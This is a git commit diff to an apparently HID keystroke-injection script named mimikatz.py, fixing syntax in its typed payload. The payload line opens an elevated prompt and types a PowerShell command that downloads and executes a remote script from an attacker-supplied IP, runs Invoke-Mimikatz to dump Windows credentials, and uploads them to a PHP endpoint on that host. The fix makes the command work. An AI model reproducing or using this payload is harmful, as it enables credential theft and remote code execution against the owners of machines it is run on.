4914de5c0c360a722f36ce7b8c39b649679857d9
kuroemon2509 <yokobang99@gmail.com>
2019-06-30 02:54:13 +0100

    mimikatz fix syntax

--- mimikatz.py
+++ mimikatz.py
@@ -21,7 +21,7 @@ if __name__ == "__main__":
     args = parser.parse_args()
 
     HID.utils.windows.command_prompt(run_as=True)
-    time.sleep(5.0)
-    HID.type_string('powershell \"IEX (New-Object New.WebClient).DownloadString(\'http://{}/im.ps1\'); $output = Invoke-Mimikatz -DumpCreds; (New-Object Net.WebClient).UploadString(\'http://{}/rx.php\', $output\")\n'.format(args.ip, args.ip))
+    time.sleep(3.0)
+    HID.type_string('powershell \"IEX (New-Object Net.WebClient).DownloadString(\'http://{}/im.ps1\'); $output = Invoke-Mimikatz -DumpCreds; (New-Object Net.WebClient).UploadString(\'http://{}/rx.php\', $output)\"\n'.format(args.ip, args.ip))
     
     time.sleep(15.0)
